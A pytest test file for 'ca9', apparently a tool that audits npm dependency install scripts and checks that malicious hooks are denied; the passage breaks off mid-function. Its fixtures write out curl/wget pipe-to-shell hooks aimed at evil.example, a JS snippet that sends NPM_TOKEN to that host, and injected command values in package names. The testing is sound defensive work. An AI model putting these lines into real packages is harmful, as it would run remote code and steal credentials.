from __future__ import annotations

import base64
import hashlib
import io
import json
import tarfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from click.testing import CliRunner

from ca9.analyzers.install_scripts import ScriptHook
from ca9.artifacts.fetch import ArtifactScanConfig
from ca9.cli import main
from ca9.core.models import Artifact, Package
from ca9.package_feed import update_feed_from_source
from ca9.package_policy import MalwarePolicy, PackagePolicy, RegistriesPolicy
from ca9.scripts_audit import (
    ScriptAuditEntry,
    ScriptsAuditError,
    ScriptsAuditReport,
    _artifact_url_permitted,
    _registry_matches,
    build_scripts_audit_report,
    scripts_audit_report_to_commands,
    scripts_audit_report_to_table,
)

_SAFE_BINDING_GYP = b'{"targets": [{"target_name": "fixture", "sources": []}]}'


def _write_lock(repo: Path, entries: dict[str, dict]) -> None:
    dependencies = {name.split("/")[-1]: "*" for name in entries}
    packages: dict[str, dict] = {
        "": {"name": "fixture-app", "version": "1.0.0", "dependencies": dependencies}
    }
    for name, entry in entries.items():
        packages[f"node_modules/{name}"] = entry
    lock = {
        "name": "fixture-app",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": packages,
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))


def _set_root_dependency_spec(repo: Path, name: str, specifier: str) -> None:
    lock_path = repo / "package-lock.json"
    lock = json.loads(lock_path.read_text())
    lock["packages"][""]["dependencies"][name] = specifier
    lock_path.write_text(json.dumps(lock))


def _write_node_module(repo: Path, name: str, version: str, scripts: dict[str, str]) -> None:
    module_dir = repo / "node_modules" / name
    module_dir.mkdir(parents=True, exist_ok=True)
    manifest = {"name": name, "version": version, "scripts": scripts}
    (module_dir / "package.json").write_text(json.dumps(manifest))


def _lock_entry(name: str, version: str, **extra) -> dict:
    basename = name.rsplit("/", 1)[-1]
    entry = {
        "version": version,
        "resolved": f"https://registry.npmjs.org/{name}/-/{basename}-{version}.tgz",
        "integrity": "sha512-" + base64.b64encode(hashlib.sha512(name.encode()).digest()).decode(),
        "hasInstallScript": True,
    }
    entry.update(extra)
    return entry


def _write_tarball(
    path: Path,
    name: str,
    version: str,
    scripts: dict[str, str],
    *,
    extra_files: dict[str, bytes] | None = None,
    binding_gyp: bytes | None = _SAFE_BINDING_GYP,
    manifest_extra: dict | None = None,
) -> str:
    manifest_data = {"name": name, "version": version, "scripts": scripts}
    manifest_data.update(manifest_extra or {})
    manifest = json.dumps(manifest_data).encode()
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        info = tarfile.TarInfo("package/package.json")
        info.size = len(manifest)
        archive.addfile(info, io.BytesIO(manifest))
        if binding_gyp is not None:
            binding_info = tarfile.TarInfo("package/binding.gyp")
            binding_info.size = len(binding_gyp)
            archive.addfile(binding_info, io.BytesIO(binding_gyp))
        for relative_path, content in (extra_files or {}).items():
            extra_info = tarfile.TarInfo(relative_path)
            extra_info.size = len(content)
            archive.addfile(extra_info, io.BytesIO(content))
    path.write_bytes(buffer.getvalue())
    digest = hashlib.sha512(buffer.getvalue()).digest()
    return "sha512-" + base64.b64encode(digest).decode()


def _feed_bundle(tmp_path: Path, npm_malware: list[dict]) -> Path:
    now = datetime.now(timezone.utc)
    bundle = {
        "schema": "ca9.feed.v1",
        "created_at": now.isoformat(),
        "expires_at": (now + timedelta(days=1)).isoformat(),
        "datasets": {
            "npm-malware": {"packages": npm_malware},
            "pypi-malware": {"packages": []},
            "npm-releases": {"packages": {}},
            "pypi-releases": {"packages": {}},
        },
    }
    bundle_path = tmp_path / "feed-bundle.json"
    bundle_path.write_text(json.dumps(bundle))
    return bundle_path


def test_benign_node_modules_script_requires_verified_artifact_analysis(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"native-lib": _lock_entry("native-lib", "1.0.0")})
    _write_node_module(repo, "native-lib", "1.0.0", {"install": "node-gyp rebuild"})

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert len(report.entries) == 1
    entry = report.entries[0]
    assert entry.verdict == "review"
    assert entry.scripts_source == "node_modules"
    assert entry.reasons == ("benign:node-gyp",)
    assert entry.notes == ("verified-artifact-analysis-required",)
    assert report.exit_code == 2


def test_suspicious_script_is_denied(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"bad-lib": _lock_entry("bad-lib", "2.0.0")})
    _write_node_module(
        repo, "bad-lib", "2.0.0", {"postinstall": "curl https://evil.example/x.sh | sh"}
    )

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert report.entries[0].verdict == "deny"
    assert "npm-install-script-exec" in report.entries[0].reasons
    assert report.exit_code == 1


def test_missing_script_evidence_is_review(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"opaque-lib": _lock_entry("opaque-lib", "3.0.0")})

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    entry = report.entries[0]
    assert entry.verdict == "review"
    assert entry.scripts_source == "unavailable"
    assert entry.reasons == ("scripts-unavailable",)
    assert report.exit_code == 2


def test_node_modules_version_mismatch_is_not_trusted(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"drifted-lib": _lock_entry("drifted-lib", "1.0.0")})
    _write_node_module(repo, "drifted-lib", "9.9.9", {"install": "node-gyp rebuild"})

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert report.entries[0].verdict == "review"
    assert report.entries[0].scripts_source == "unavailable"


def test_manifest_without_install_hooks_is_review(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"phantom-lib": _lock_entry("phantom-lib", "1.0.0")})
    _write_node_module(repo, "phantom-lib", "1.0.0", {"test": "jest"})

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert report.entries[0].verdict == "review"
    assert report.entries[0].reasons == ("lock-manifest-mismatch",)


def test_scoped_package_scripts_resolve_from_node_modules(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"@scope/native": _lock_entry("@scope/native", "1.2.3")})
    _write_node_module(repo, "@scope/native", "1.2.3", {"install": "node-gyp-build"})

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert report.entries[0].verdict == "review"
    assert report.entries[0].reasons == ("benign:node-gyp-build",)


def test_malware_feed_match_denies_benign_script(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"native-lib": _lock_entry("native-lib", "1.0.0")})
    _write_node_module(repo, "native-lib", "1.0.0", {"install": "node-gyp rebuild"})

    feed_cache = tmp_path / "cache" / "feed"
    bundle = _feed_bundle(
        tmp_path,
        [{"name": "native-lib", "version": "1.0.0", "id": "MAL-2026-1", "summary": "malware"}],
    )
    update_feed_from_source(str(bundle), cache_dir=feed_cache)

    report = build_scripts_audit_report(
        repo,
        package_policy=PackagePolicy(),
        feed_cache_dir=feed_cache,
        fetch_artifacts=False,
    )

    entry = report.entries[0]
    assert entry.verdict == "deny"
    assert "feed:MAL-2026-1" in entry.reasons
    assert "benign:node-gyp" in entry.reasons
    assert report.exit_code == 1


def test_artifact_fallback_reads_tarball_scripts(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    tarball = repo / "tar-lib-1.0.0.tgz"
    integrity = _write_tarball(tarball, "tar-lib", "1.0.0", {"install": "node-gyp rebuild"})
    _write_lock(
        repo,
        {
            "tar-lib": {
                "version": "1.0.0",
                "resolved": str(tarball),
                "integrity": integrity,
                "hasInstallScript": True,
            }
        },
    )

    report = build_scripts_audit_report(
        repo,
        artifact_config=ArtifactScanConfig(cache_dir=tmp_path / "artifact-cache"),
    )

    entry = report.entries[0]
    assert entry.scripts_source == "artifact"
    assert entry.verdict == "review"
    assert entry.reasons == (
        "benign:node-gyp",
        "trusted-version-unavailable",
        "executable-provenance-unverified",
    )


@pytest.mark.parametrize(
    "binding_gyp, expected_reason",
    [
        (None, "binding-gyp-missing"),
        (
            b'{"targets": [], "actions": [{"action": ["sh", "payload.sh"]}]}',
            "binding-gyp-actions",
        ),
    ],
)
def test_native_allow_candidate_requires_safe_build_controls(
    tmp_path,
    binding_gyp,
    expected_reason,
):
    repo = tmp_path / "repo"
    repo.mkdir()
    tarball = repo / "native-lib-1.0.0.tgz"
    integrity = _write_tarball(
        tarball,
        "native-lib",
        "1.0.0",
        {"install": "node-gyp rebuild"},
        binding_gyp=binding_gyp,
    )
    _write_lock(
        repo,
        {
            "native-lib": {
                "version": "1.0.0",
                "resolved": str(tarball),
                "integrity": integrity,
                "hasInstallScript": True,
            }
        },
    )
    report = build_scripts_audit_report(
        repo,
        artifact_config=ArtifactScanConfig(cache_dir=tmp_path / "artifact-cache"),
    )

    assert report.entries[0].verdict == "review"
    assert expected_reason in report.entries[0].reasons


def test_non_registry_prepare_hook_is_audited(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    tarball = repo / "git-style-lib-1.0.0.tgz"
    integrity = _write_tarball(
        tarball,
        "git-style-lib",
        "1.0.0",
        {
            "install": "node-gyp rebuild",
            "prepare": "curl https://evil.example/payload | sh",
        },
    )
    _write_lock(
        repo,
        {
            "git-style-lib": {
                "version": "1.0.0",
                "resolved": str(tarball),
                "integrity": integrity,
                "hasInstallScript": True,
            }
        },
    )
    _set_root_dependency_spec(repo, "git-style-lib", f"file:{tarball}")

    report = build_scripts_audit_report(
        repo,
        artifact_config=ArtifactScanConfig(cache_dir=tmp_path / "artifact-cache"),
    )

    entry = report.entries[0]
    assert [hook.name for hook in entry.hooks] == ["install", "prepare"]
    assert entry.verdict == "deny"
    assert "npm-install-script-exec" in entry.reasons


def test_report_outputs_do_not_approve_offline_candidates(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(
        repo,
        {
            "native-lib": _lock_entry("native-lib", "1.0.0"),
            "bad-lib": _lock_entry("bad-lib", "2.0.0"),
            "opaque-lib": _lock_entry("opaque-lib", "3.0.0"),
        },
    )
    _write_node_module(repo, "native-lib", "1.0.0", {"install": "node-gyp rebuild"})
    _write_node_module(repo, "bad-lib", "2.0.0", {"postinstall": "wget https://x.example | sh"})

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    table = scripts_audit_report_to_table(report)
    assert "[DENY] bad-lib@2.0.0" in table
    assert "[REVIEW] opaque-lib@3.0.0" in table
    assert "[REVIEW] native-lib@1.0.0" in table

    commands = scripts_audit_report_to_commands(report)
    lines = commands.splitlines()
    assert any(line.startswith("npm deny-scripts bad-lib") for line in lines)
    assert not any(line.startswith("npm approve-scripts native-lib") for line in lines)
    assert not any("opaque-lib" in line and line.startswith("npm ") for line in lines)
    assert any("review needed" in line and "opaque-lib" in line for line in lines)

    deny_index = next(i for i, line in enumerate(lines) if line.startswith("npm deny-scripts"))
    review_index = next(i for i, line in enumerate(lines) if "native-lib" in line)
    assert deny_index < review_index


def test_cli_scripts_audit_json_and_review_exit_code(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"native-lib": _lock_entry("native-lib", "1.0.0")})
    _write_node_module(repo, "native-lib", "1.0.0", {"install": "node-gyp rebuild"})

    runner = CliRunner()
    result = runner.invoke(main, ["scripts", "audit", str(repo), "--offline", "-f", "json"])

    assert result.exit_code == 2, result.output
    payload = json.loads(result.output)
    assert payload["schema_version"] == "ca9.scripts-audit.v1"
    assert payload["summary"]["review"] == 1
    assert payload["packages"][0]["verdict"] == "review"


def test_cli_scripts_audit_emit_commands_and_deny_exit_code(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"bad-lib": _lock_entry("bad-lib", "2.0.0")})
    _write_node_module(
        repo, "bad-lib", "2.0.0", {"postinstall": "curl https://evil.example/x.sh | sh"}
    )

    runner = CliRunner()
    result = runner.invoke(main, ["scripts", "audit", str(repo), "--offline", "--emit", "commands"])

    assert result.exit_code == 1
    assert "npm deny-scripts bad-lib" in result.output


def test_no_install_scripts_yields_clean_report(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(
        repo,
        {
            "plain-lib": {
                "version": "1.0.0",
                "resolved": "https://registry.npmjs.org/plain-lib/-/plain-lib-1.0.0.tgz",
                "integrity": "sha512-abc",
            }
        },
    )

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert report.entries == ()
    assert report.exit_code == 0
    assert "No dependency install scripts found." in scripts_audit_report_to_table(report)


@pytest.mark.parametrize(
    "contents, expected",
    [
        (None, "package-lock.json is required"),
        ("{not-json", "cannot parse package-lock.json"),
        (
            json.dumps({"lockfileVersion": 1, "packages": {"": {}}}),
            "unsupported package-lock.json lockfileVersion",
        ),
        (
            json.dumps({"lockfileVersion": 3, "packages": []}),
            "packages table must be an object",
        ),
    ],
)
def test_invalid_lockfile_is_a_hard_audit_error(tmp_path, contents, expected):
    repo = tmp_path / "repo"
    repo.mkdir()
    if contents is not None:
        (repo / "package-lock.json").write_text(contents)

    with pytest.raises(ScriptsAuditError, match=expected):
        build_scripts_audit_report(repo, fetch_artifacts=False)


def _report_entry(name: str, version: str, verdict: str, reason: str) -> ScriptAuditEntry:
    basename = name.rsplit("/", 1)[-1]
    artifact_url = f"https://registry.npmjs.org/{name}/-/{basename}-{version}.tgz"
    return ScriptAuditEntry(
        package=Package(
            name=name,
            version=version,
            ecosystem="npm",
            artifacts=(Artifact(kind="npm-tarball", url=artifact_url),),
            metadata={
                "lock_path": f"node_modules/{name}",
                "installed_names": [name],
                "requested_source_kind": "registry",
            },
        ),
        hooks=(ScriptHook(name="install", command="node-gyp rebuild"),),
        verdict=verdict,
        reasons=(reason,),
        notes=(),
        scripts_source="artifact",
        installed_tree_verified=True,
    )


def test_commands_group_versions_and_never_approve_a_mixed_name():
    report = ScriptsAuditReport(
        repo_path="/safe/repo",
        entries=(
            _report_entry("mixed-lib", "1.0.0", "allow-candidate", "benign:node-gyp"),
            _report_entry("mixed-lib", "2.0.0", "review", "no-benign-match"),
            _report_entry("denied-lib", "1.0.0", "allow-candidate", "benign:node-gyp"),
            _report_entry("denied-lib", "2.0.0", "deny", "feed:MAL-1"),
            _report_entry("safe-lib", "1.0.0", "allow-candidate", "benign:node-gyp"),
        ),
    )

    commands = scripts_audit_report_to_commands(report)

    assert "npm approve-scripts mixed-lib" not in commands
    assert "npm approve-scripts denied-lib" not in commands
    assert commands.count("npm deny-scripts denied-lib") == 1
    assert commands.count("npm approve-scripts safe-lib --allow-scripts-pin") == 1
    assert "audited versions: 1.0.0, 2.0.0" in commands


def test_commands_sanitize_untrusted_fields_and_block_invalid_names():
    report = ScriptsAuditReport(
        repo_path="/repo\nrm -rf nope",
        entries=(
            _report_entry(
                "bad\nname;touch-pwned",
                "1.0.0\ninjected",
                "allow-candidate",
                "reason\nnpm approve-scripts pwned",
            ),
        ),
        warnings=("warning\nnpm approve-scripts pwned",),
    )

    commands = scripts_audit_report_to_commands(report)

    assert "npm approve-scripts bad" not in commands
    assert "\nnpm approve-scripts pwned" not in commands
    assert "policy identity unavailable" in commands


def test_fail_closed_missing_feed_blocks_report_and_suppresses_approvals(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    tarball = repo / "native-lib.tgz"
    integrity = _write_tarball(
        tarball,
        "native-lib",
        "1.0.0",
        {"install": "node-gyp rebuild"},
    )
    _write_lock(
        repo,
        {
            "native-lib": {
                "version": "1.0.0",
                "resolved": str(tarball),
                "integrity": integrity,
                "hasInstallScript": True,
            }
        },
    )
    policy = PackagePolicy(malware=MalwarePolicy(enabled=True, fail_closed=True))

    report = build_scripts_audit_report(
        repo,
        package_policy=policy,
        feed_cache_dir=tmp_path / "missing-feed",
        artifact_config=ArtifactScanConfig(cache_dir=tmp_path / "artifact-cache"),
    )

    assert report.blockers
    assert report.exit_code == 1
    assert report.entries[0].verdict == "review"
    assert "audit-blocked" in report.entries[0].reasons
    assert "npm approve-scripts native-lib" not in scripts_audit_report_to_commands(report)


def test_fail_open_missing_feed_is_visible_and_cannot_create_offline_approval(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"native-lib": _lock_entry("native-lib", "1.0.0")})
    _write_node_module(repo, "native-lib", "1.0.0", {"install": "node-gyp rebuild"})
    policy = PackagePolicy(malware=MalwarePolicy(enabled=True, fail_closed=False))

    report = build_scripts_audit_report(
        repo,
        package_policy=policy,
        feed_cache_dir=tmp_path / "missing-feed",
        fetch_artifacts=False,
    )

    assert report.entries[0].verdict == "review"
    assert "malware-tier-unavailable" in report.entries[0].reasons
    assert any("malware feed is missing" in warning for warning in report.warnings)
    assert "npm approve-scripts native-lib" not in scripts_audit_report_to_commands(report)


def test_non_native_review_does_not_claim_native_evidence_is_missing(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    tarball = repo / "custom-lib.tgz"
    integrity = _write_tarball(
        tarball,
        "custom-lib",
        "1.0.0",
        {"install": "node install.js"},
        binding_gyp=None,
    )
    _write_lock(
        repo,
        {
            "custom-lib": {
                "version": "1.0.0",
                "resolved": str(tarball),
                "integrity": integrity,
                "hasInstallScript": True,
            }
        },
    )

    report = build_scripts_audit_report(
        repo,
        artifact_config=ArtifactScanConfig(cache_dir=tmp_path / "artifact-cache"),
    )

    assert report.entries[0].verdict == "review"
    assert report.entries[0].reasons == (
        "no-benign-match",
        "trusted-version-unavailable",
    )


def test_unsafe_lock_package_path_is_a_hard_error(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    lock = {
        "lockfileVersion": 3,
        "packages": {
            "": {},
            "../node_modules/escaped": _lock_entry("escaped", "1.0.0"),
        },
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))

    with pytest.raises(ScriptsAuditError, match="unsafe package path"):
        build_scripts_audit_report(repo, fetch_artifacts=False)


def test_denied_registry_is_not_fetched_and_denies(monkeypatch, tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"native-lib": _lock_entry("native-lib", "1.0.0")})
    _write_node_module(repo, "native-lib", "1.0.0", {"install": "node-gyp rebuild"})
    policy = PackagePolicy(
        registries=RegistriesPolicy(deny=("registry.npmjs.org",)),
        malware=MalwarePolicy(enabled=False),
    )

    def fail_if_fetched(*_args, **_kwargs):
        raise AssertionError("denied registry artifact was fetched")

    monkeypatch.setattr("ca9.scripts_audit.collect_artifact_snapshots", fail_if_fetched)
    report = build_scripts_audit_report(repo, package_policy=policy)

    assert report.entries[0].verdict == "deny"
    assert "policy:denied-registry" in report.entries[0].reasons


def test_unapproved_registry_is_not_fetched_and_requires_review(monkeypatch, tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    entry = _lock_entry("native-lib", "1.0.0")
    entry["resolved"] = "https://packages.example/native-lib-1.0.0.tgz"
    _write_lock(repo, {"native-lib": entry})
    _write_node_module(repo, "native-lib", "1.0.0", {"install": "node-gyp rebuild"})
    policy = PackagePolicy(malware=MalwarePolicy(enabled=False))

    def fail_if_fetched(*_args, **_kwargs):
        raise AssertionError("unapproved registry artifact was fetched")

    monkeypatch.setattr("ca9.scripts_audit.collect_artifact_snapshots", fail_if_fetched)
    report = build_scripts_audit_report(repo, package_policy=policy)

    assert report.entries[0].verdict == "review"
    assert "policy:unapproved-registry" in report.entries[0].reasons


def test_custom_registry_path_allowlist_matches_tarball_below_prefix(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    entry = _lock_entry("native-lib", "1.0.0")
    entry["resolved"] = (
        "https://packages.example/api/npm/internal/native-lib/-/native-lib-1.0.0.tgz"
    )
    _write_lock(repo, {"native-lib": entry})
    _write_node_module(repo, "native-lib", "1.0.0", {"install": "node-gyp rebuild"})
    policy = PackagePolicy(
        registries=RegistriesPolicy(allow=("https://packages.example/api/npm/internal",)),
        malware=MalwarePolicy(enabled=False),
    )

    report = build_scripts_audit_report(
        repo,
        package_policy=policy,
        fetch_artifacts=False,
    )

    assert report.entries[0].verdict == "review"
    assert "policy:unapproved-registry" not in report.entries[0].reasons


def test_nested_node_modules_manifest_uses_lock_path(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    lock = {
        "name": "fixture-app",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "": {"dependencies": {"parent": "1.0.0"}},
            "node_modules/parent": {
                "version": "1.0.0",
                "dependencies": {"nested-lib": "2.0.0"},
            },
            "node_modules/parent/node_modules/nested-lib": {
                **_lock_entry("nested-lib", "2.0.0"),
            },
        },
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))
    nested = repo / "node_modules" / "parent" / "node_modules" / "nested-lib"
    nested.mkdir(parents=True)
    (nested / "package.json").write_text(
        json.dumps(
            {
                "name": "nested-lib",
                "version": "2.0.0",
                "scripts": {"postinstall": "curl https://evil.example/x | sh"},
            }
        )
    )

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert report.entries[0].scripts_source == "node_modules"
    assert report.entries[0].verdict == "deny"


def test_workspace_package_is_excluded(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    lock = {
        "name": "fixture-app",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "": {"workspaces": ["packages/*"], "dependencies": {"local-lib": "*"}},
            "node_modules/local-lib": {"resolved": "packages/local-lib", "link": True},
            "packages/local-lib": {
                "name": "local-lib",
                "version": "1.0.0",
                "hasInstallScript": True,
            },
        },
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert report.entries == ()


def test_node_modules_manifest_does_not_bypass_artifact_code_analysis(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    tarball = repo / "native-lib.tgz"
    malicious_js = (
        b"const token = process.env.NPM_TOKEN; "
        b"require('https').get('https://evil.example/?token=' + token);"
    )
    integrity = _write_tarball(
        tarball,
        "native-lib",
        "1.0.0",
        {"install": "node-gyp rebuild"},
        extra_files={"package/install.js": malicious_js},
    )
    _write_lock(
        repo,
        {
            "native-lib": {
                "version": "1.0.0",
                "resolved": str(tarball),
                "integrity": integrity,
                "hasInstallScript": True,
            }
        },
    )
    _write_node_module(repo, "native-lib", "1.0.0", {"install": "node-gyp rebuild"})

    report = build_scripts_audit_report(
        repo,
        artifact_config=ArtifactScanConfig(cache_dir=tmp_path / "artifact-cache"),
    )

    assert report.entries[0].verdict == "deny"
    assert "npm-credential-exfiltration" in report.entries[0].reasons


def test_artifact_manifest_must_match_locked_name_and_version(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    tarball = repo / "tar-lib.tgz"
    integrity = _write_tarball(
        tarball,
        "different-name",
        "1.0.0",
        {"install": "node-gyp rebuild"},
    )
    _write_lock(
        repo,
        {
            "tar-lib": {
                "version": "1.0.0",
                "resolved": str(tarball),
                "integrity": integrity,
                "hasInstallScript": True,
            }
        },
    )

    report = build_scripts_audit_report(
        repo,
        artifact_config=ArtifactScanConfig(cache_dir=tmp_path / "artifact-cache"),
    )

    assert report.entries[0].verdict == "review"
    assert report.entries[0].scripts_source == "unavailable"
    assert "artifact-manifest-mismatch" in report.entries[0].reasons


def test_same_name_version_occurrences_are_audited_independently(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    safe_tarball = repo / "dup-safe.tgz"
    bad_tarball = repo / "dup-bad.tgz"
    safe_integrity = _write_tarball(
        safe_tarball,
        "dup-lib",
        "1.0.0",
        {"install": "node-gyp rebuild"},
    )
    bad_integrity = _write_tarball(
        bad_tarball,
        "dup-lib",
        "1.0.0",
        {"postinstall": "curl https://evil.example/payload | sh"},
    )
    lock = {
        "name": "fixture-app",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "": {
                "dependencies": {"dup-lib": "1.0.0", "parent": "1.0.0"},
            },
            "node_modules/dup-lib": {
                "version": "1.0.0",
                "resolved": str(safe_tarball),
                "integrity": safe_integrity,
                "hasInstallScript": True,
            },
            "node_modules/parent": {
                "version": "1.0.0",
                "dependencies": {"dup-lib": "1.0.0"},
            },
            "node_modules/parent/node_modules/dup-lib": {
                "version": "1.0.0",
                "resolved": str(bad_tarball),
                "integrity": bad_integrity,
                "hasInstallScript": True,
            },
        },
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))
    _write_node_module(repo, "dup-lib", "1.0.0", {"install": "node-gyp rebuild"})
    nested = repo / "node_modules" / "parent" / "node_modules" / "dup-lib"
    nested.mkdir(parents=True)
    (nested / "package.json").write_text(
        json.dumps(
            {
                "name": "dup-lib",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl https://evil.example/payload | sh"},
            }
        )
    )

    report = build_scripts_audit_report(
        repo,
        artifact_config=ArtifactScanConfig(cache_dir=tmp_path / "artifact-cache"),
    )

    assert len(report.entries) == 2
    assert {entry.package.metadata["lock_path"] for entry in report.entries} == {
        "node_modules/dup-lib",
        "node_modules/parent/node_modules/dup-lib",
    }
    assert sum(entry.verdict == "deny" for entry in report.entries) == 1
    assert "npm deny-scripts dup-lib" in scripts_audit_report_to_commands(report)


def test_installed_and_artifact_script_drift_cannot_hide_a_local_deny(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    tarball = repo / "drift-lib.tgz"
    integrity = _write_tarball(
        tarball,
        "drift-lib",
        "1.0.0",
        {"install": "node-gyp rebuild"},
    )
    _write_lock(
        repo,
        {
            "drift-lib": {
                "version": "1.0.0",
                "resolved": str(tarball),
                "integrity": integrity,
                "hasInstallScript": True,
            }
        },
    )
    _write_node_module(
        repo,
        "drift-lib",
        "1.0.0",
        {"postinstall": "curl https://evil.example/payload | sh"},
    )

    report = build_scripts_audit_report(
        repo,
        artifact_config=ArtifactScanConfig(cache_dir=tmp_path / "artifact-cache"),
    )

    entry = report.entries[0]
    assert entry.verdict == "deny"
    assert entry.scripts_source == "node_modules+artifact"
    assert "installed-artifact-script-drift" in entry.reasons
    assert "npm-install-script-exec" in entry.reasons


def test_direct_remote_tarball_prepare_hook_is_audited_offline(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    resolved = "https://packages.example/remote-lib.tgz"
    lock = {
        "name": "fixture-app",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "": {"dependencies": {"remote-lib": resolved}},
            "node_modules/remote-lib": {
                "version": "1.0.0",
                "resolved": resolved,
                "integrity": "sha512-test",
                "hasInstallScript": True,
            },
        },
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))
    _write_node_module(
        repo,
        "remote-lib",
        "1.0.0",
        {
            "install": "node-gyp rebuild",
            "prepare": "curl https://evil.example/payload | sh",
        },
    )

    report = build_scripts_audit_report(
        repo,
        package_policy=PackagePolicy(
            registries=RegistriesPolicy(allow=("packages.example",)),
            malware=MalwarePolicy(enabled=False),
        ),
        fetch_artifacts=False,
    )

    assert [hook.name for hook in report.entries[0].hooks] == ["install", "prepare"]
    assert report.entries[0].verdict == "deny"


def test_external_file_dependency_is_visible_as_review(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    lock = {
        "name": "fixture-app",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "": {"dependencies": {"external-lib": "file:../external-lib"}},
            "../external-lib": {
                "name": "external-lib",
                "version": "1.0.0",
                "hasInstallScript": True,
            },
            "node_modules/external-lib": {
                "resolved": "../external-lib",
                "link": True,
            },
        },
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert len(report.entries) == 1
    assert report.entries[0].verdict == "review"
    assert "external-local-source" in report.entries[0].reasons


def test_scripted_entry_without_version_cannot_become_a_clean_empty_audit(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    lock = {
        "name": "fixture-app",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "": {"dependencies": {"unversioned-lib": "https://packages.example/unversioned.tgz"}},
            "node_modules/unversioned-lib": {
                "resolved": "https://packages.example/unversioned.tgz",
                "hasInstallScript": True,
            },
        },
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert len(report.entries) == 1
    assert report.entries[0].package.version is None
    assert report.entries[0].verdict == "review"


def test_exact_lock_manifest_resolution_does_not_use_recursive_glob(monkeypatch, tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write_lock(repo, {"exact-lib": _lock_entry("exact-lib", "1.0.0")})
    _write_node_module(repo, "exact-lib", "1.0.0", {"install": "node-gyp rebuild"})

    def fail_glob(*_args, **_kwargs):
        raise AssertionError("recursive fallback glob should not be used")

    monkeypatch.setattr(Path, "glob", fail_glob)

    report = build_scripts_audit_report(repo, fetch_artifacts=False)

    assert report.entries[0].scripts_source == "node_modules"


@pytest.mark.parametrize(
    ("registry", "policy_entry", "expected"),
    [
        ("https://registry.example/%70rivate/pkg.tgz", "registry.example/private", True),
        ("https://registry.example/public/../private/pkg.tgz", "registry.example/private", True),
        ("https://registry.example./private/pkg.tgz", "registry.example/private", True),
        ("https://registry.example/private/pkg.tgz", "https://registry.example:443/private", True),
        ("https://user@registry.example/private/pkg.tgz", "registry.example/private", False),
        ("https://registry.example/internal/pkg.tgz", "registry.example/Internal", False),
        ("https://registry.example/%2570rivate/pkg.tgz", "registry.example/private", False),
    ],
)
def test_registry_policy_identity_is_canonical_and_case_sensitive(registry, policy_entry, expected):
    assert _registry_matches(registry, (policy_entry,)) is expected


@pytest.mark.parametrize(
    "url",
    [
        "ftp://packages.example/archive.tgz",
        "data:application/gzip;base64,AAAA",
        "//server/share/archive.tgz",
        "\\\\server\\share\\archive.tgz",
    ],
)
def test_scripts_audit_rejects_nonlocal_non_http_artifact_schemes(url):
    assert _artifact_url_permitted(url, None) is False


def test_external_binary_alias_cannot_become_an_allow_candidate(tmp_path):
    repo = tmp_path / "repo"
